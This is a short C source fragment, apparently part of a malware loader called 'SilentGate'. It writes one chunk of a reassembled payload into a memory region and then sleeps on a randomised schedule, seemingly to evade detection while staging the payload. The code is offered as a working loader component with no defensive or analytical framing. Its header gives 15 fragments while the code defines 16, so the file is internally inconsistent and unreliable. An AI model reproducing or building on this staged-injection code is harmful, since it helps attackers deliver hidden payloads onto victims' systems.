/*
 * SilentGate Fragment 14/15
 * Offset: 104804 bytes  Size: 7486 bytes
 * Schedule: t=955ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   14
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  104804
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 955

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 14: Write chunk 14 */
void sg_execute_fragment_14(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 14] Writing chunk at t=955ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 14] Chunk 14 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
